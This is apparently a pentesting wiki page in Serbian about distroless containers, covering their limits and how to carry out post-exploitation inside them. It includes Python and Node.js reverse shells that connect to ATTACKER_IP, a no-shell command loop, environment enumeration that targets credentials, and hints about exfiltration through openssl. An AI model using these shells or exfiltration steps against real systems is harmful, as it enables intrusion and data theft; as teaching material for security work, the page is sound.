# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**distroless** container image je image koji sadrži **minimalne runtime komponente potrebne za pokretanje jedne konkretne aplikacije**, dok namerno uklanja uobičajene alate distribucije, kao što su package manageri, shell-ovi i veliki skupovi generičkih userland alata. U praksi, distroless image-i često sadrže samo binary ili runtime aplikacije, shared libraries, certificate bundles i veoma malu strukturu filesystema.

Poenta nije u tome da je distroless nova kernel isolation primitive. Distroless je **strategija dizajniranja image-a**. Ona menja ono što je dostupno **unutar** container filesystema, a ne način na koji kernel izoluje container. Ova razlika je važna, jer distroless prvenstveno hardenuje okruženje tako što smanjuje ono što attacker može da koristi nakon dobijanja code execution-a. Ne zamenjuje namespaces, seccomp, capabilities, AppArmor, SELinux niti bilo koji drugi mehanizam runtime isolation-a.

## Why Distroless Exists

Distroless image-i se prvenstveno koriste za smanjenje:

- veličine image-a
- operational complexity-ja image-a
- broja package-a i binary-ja koji mogu sadržati vulnerabilities
- broja post-exploitation alata koji su attacker-u podrazumevano dostupni

Zbog toga su distroless image-i popularni u production application deployment-ima. Container koji ne sadrži shell, package manager i gotovo nikakve generičke alate obično je lakše operationalno analizirati i teže ga je interaktivno zloupotrebiti nakon kompromitovanja.

Primeri poznatih distroless-style image family-ja uključuju:

- Google's distroless images
- Chainguard hardened/minimal images

## What Distroless Does Not Mean

Distroless container **nije**:

- automatski rootless
- automatski non-privileged
- automatski read-only
- automatski zaštićen pomoću seccomp-a, AppArmor-a ili SELinux-a
- automatski bezbedan od container escape-a

I dalje je moguće pokrenuti distroless image sa `--privileged`, deljenjem host namespace-a, opasnim bind mount-ovima ili mount-ovanim runtime socket-om. U tom slučaju image može biti minimalan, ali container i dalje može biti katastrofalno nebezbedan. Distroless menja **userland attack surface**, a ne **kernel trust boundary**.

## Typical Operational Characteristics

Kada kompromitujete distroless container, prvo što obično primetite jeste da uobičajene pretpostavke više ne važe. Možda nema `sh`, `bash`, `ls`, `id`, `cat`, a ponekad čak ni libc-based okruženja koje se ponaša onako kako vaš uobičajeni tradecraft očekuje. Ovo utiče i na offense i na defense, jer nedostatak alata čini debugging, incident response i post-exploitation drugačijim.

Najčešći pattern-i su:

- application runtime postoji, ali gotovo ničeg drugog nema
- shell-based payload-i ne uspevaju jer nema shell-a
- uobičajeni enumeration one-liner-i ne uspevaju jer helper binary-ji nedostaju
- filesystem protections, kao što su read-only rootfs ili `noexec` na writable tmpfs lokacijama, često su takođe prisutne

Upravo ta kombinacija obično navodi ljude da govore o "weaponizing distroless".

## Distroless And Post-Exploitation

Glavni offensive challenge u distroless okruženju nije uvek početni RCE. Često je važnije ono što sledi. Ako compromised workload omogućava code execution u language runtime-u kao što su Python, Node.js, Java ili Go, možda ćete moći da izvršavate proizvoljnu logiku, ali ne i kroz uobičajene shell-centric workflow-e koji su česti na drugim Linux targetima.

To znači da se post-exploitation često usmerava u jednom od tri pravca:

1. **Direktno koristiti postojeći language runtime** za enumeration okruženja, otvaranje socket-a, čitanje file-ova ili staging dodatnih payload-a.
2. **Uneti sopstvene alate u memory** ako je filesystem read-only ili su writable lokacije mount-ovane sa `noexec`.
3. **Zloupotrebiti postojeće binary-je koji su već prisutni u image-u** ako application ili njene dependencies sadrže nešto neočekivano korisno.

## Abuse

### Enumerate The Runtime You Already Have

U mnogim distroless container-ima nema shell-a, ali application runtime i dalje postoji. Ako je target Python service, Python je prisutan. Ako je target Node.js, Node je prisutan. To često pruža dovoljno funkcionalnosti za enumeration file-ova, čitanje environment variable-a, otvaranje reverse shell-ova i staging in-memory execution-a, bez ikakvog pozivanja `/bin/sh`.

Jednostavan primer sa Python-om:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Jednostavan primer sa Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Uticaj:

- preuzimanje environment variables, često uključujući credentials ili service endpoints
- enumeracija filesystem-a bez `/bin/ls`
- identifikacija writable putanja i mountovanih secrets

### Reverse Shell Without `/bin/sh`

Ako image ne sadrži `sh` ili `bash`, klasični reverse shell zasnovan na shell-u može odmah da ne uspe. U toj situaciji koristite instalirani language runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Ako `/bin/sh` ne postoji, zamenite poslednju liniju direktnim izvršavanjem komandi pomoću Python-a ili Python REPL petljom.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Opet, ako `/bin/sh` nije prisutan, koristite Node-ove filesystem, process i networking API-je direktno umesto pokretanja shell-a.

### Full Example: No-Shell Python Command Loop

Ako image ima Python, ali uopšte nema shell, jednostavna interaktivna petlja često je dovoljna za održavanje pune post-exploitation funkcionalnosti:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Ovo ne zahteva interaktivni shell binary. Uticaj je iz perspektive napadača praktično isti kao kod osnovnog shell-a: izvršavanje komandi, enumeracija i priprema dodatnih payload-a kroz postojeći runtime.

### Izvršavanje alata u memoriji

Distroless images se često kombinuju sa:

- `readOnlyRootFilesystem: true`
- writable, ali `noexec` tmpfs kao što je `/dev/shm`
- nedostatkom alata za upravljanje paketima

Ova kombinacija čini klasične workflow-e tipa „preuzmi binary na disk i pokreni ga“ nepouzdanim. U tim slučajevima, tehnike izvršavanja iz memorije postaju glavno rešenje.

Posebna stranica za to je:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Najrelevantnije tehnike tamo su:

- `memfd_create` + `execve` putem scripting runtime-a
- DDexec / EverythingExec
- memexec
- memdlopen

### Postojeći binariji koji su već u image-u

Neki distroless images i dalje sadrže operativno neophodne binarije koji postaju korisni nakon kompromitacije. Primer koji se često uočava je `openssl`, jer aplikacijama ponekad treba za zadatke povezane sa kriptografijom ili TLS-om.

Obrazac za brzu pretragu je:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Ako je `openssl` prisutan, može se koristiti za:

- outbound TLS veze
- data exfiltration preko dozvoljenog egress kanala
- staging payload podataka kroz kodirane/šifrovane blob-ove

Tačna zloupotreba zavisi od toga šta je zaista instalirano, ali opšta ideja je da distroless ne znači „bez ikakvih alata“; znači „mnogo manje alata nego u standardnom distribution image-u“.

## Provere

Cilj ovih provera je da se utvrdi da li je image zaista distroless u praksi i koji runtime ili pomoćni binariji su i dalje dostupni za post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Šta je ovde zanimljivo:

- Ako ne postoji shell, ali je prisutan runtime kao što su Python ili Node, post-exploitation treba preusmeriti na izvršavanje zasnovano na runtime-u.
- Ako je root filesystem samo za čitanje, a `/dev/shm` je upisiv, ali ima `noexec`, tehnike izvršavanja iz memorije postaju mnogo relevantnije.
- Ako postoje pomoćni binarni fajlovi kao što su `openssl`, `busybox` ili `java`, oni mogu ponuditi dovoljno funkcionalnosti za uspostavljanje daljeg pristupa.

## Podrazumevane postavke runtime-a

| Stil image-a / platforme | Podrazumevano stanje | Tipično ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Google distroless style images | Minimalni userland po dizajnu | Nema shell-a ni package manager-a, već samo dependencies aplikacije/runtime-a | dodavanje debugging slojeva, sidecar shell-ova, kopiranje busybox-a ili alata |
| Chainguard minimal images | Minimalni userland po dizajnu | Smanjena površina package-a, često fokusirana na jedan runtime ili servis | korišćenje `:latest-dev` ili debug varijanti, kopiranje alata tokom build-a |
| Kubernetes workloads koji koriste distroless images | Zavisi od Pod konfiguracije | Distroless utiče samo na userland; security posture Pod-a i dalje zavisi od Pod spec-a i podrazumevanih postavki runtime-a | dodavanje ephemeral debug container-a, host mount-ova, privileged Pod postavki |
| Docker / Podman koji pokreću distroless images | Zavisi od run flag-ova | Minimalni filesystem, ali runtime security i dalje zavisi od flag-ova i konfiguracije daemon-a | `--privileged`, deljenje host namespace-a, mount-ovi runtime socket-a, writable host bind-ovi |

Ključna stvar je da je distroless **svojstvo image-a**, a ne runtime protection. Njegova vrednost potiče iz smanjivanja količine onoga što je dostupno unutar filesystem-a nakon kompromitovanja.

## Povezane stranice

Za filesystem i memory-execution bypass-e koji su često potrebni u distroless okruženjima:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Za zloupotrebu container runtime-a, socket-a i mount-ova koja se i dalje primenjuje na distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
